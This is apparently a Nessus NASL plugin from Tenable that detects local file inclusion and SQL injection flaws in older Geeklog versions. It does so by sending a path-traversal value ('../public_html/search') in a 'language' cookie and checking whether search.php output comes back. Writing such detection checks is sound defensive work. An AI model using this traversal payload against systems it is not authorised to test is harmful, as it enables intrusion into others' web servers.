#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20959);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2012/12/03 23:45:17 $");

  script_cve_id("CVE-2006-0823", "CVE-2006-0824");
  script_bugtraq_id(16755);
  script_osvdb_id(23348, 23349);

  script_name(english:"Geeklog < 1.3.11sr4 / 1.4.0sr1 Multiple Remote Vulnerabilities (LFI, SQLi)");
  script_summary(english:"Checks for multiple vulnerabilities in Geeklog < 1.3.11sr4 / 1.4.0sr1");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple flaws.");
  script_set_attribute(attribute:"description", value:
"The installed version of Geeklog suffers from a number of SQL
injection and local file flaws due to a failure of the application to
sanitize user-supplied input.");
   # http://web.archive.org/web/20090202164957/http://www.gulftech.org/?node=research&article_id=00102-02192006
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4350f216");
  script_set_attribute(attribute:"see_also", value:"http://www.geeklog.net/article.php/geeklog-1.4.0sr1");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Geeklog version 1.3.11sr4 / 1.4.0sr1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/02/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/02/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:geeklog:geeklog");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2012 Tenable Network Security, Inc.");

  script_dependencies("geeklog_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/geeklog");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/geeklog"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  init_cookiejar();

  # Try to exploit the flaw to access a PHP file included with Geeklog.
  file = "../public_html/search";
  set_http_cookie(name: "language", value: file);
  r = http_send_recv3(method: "GET", item:string(dir, "/users.php"), port:port);
  if (isnull(r)) exit(0);

  # If the output looks like it came from search.php...
  if (
    '<select name="keyType">' >< r[2] &&
    '<option value="phrase">' >< r[2]
  )
  {
    # There's definitely a problem if we see two HTML documents.
    marker = "<!DOCTYPE HTML PUBLIC";
    page1 = strstr(r[2], marker);
    if (page1) page2 = page1 - marker;
    if (page2) page2 = strstr(page2, marker);
    if (page2)
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
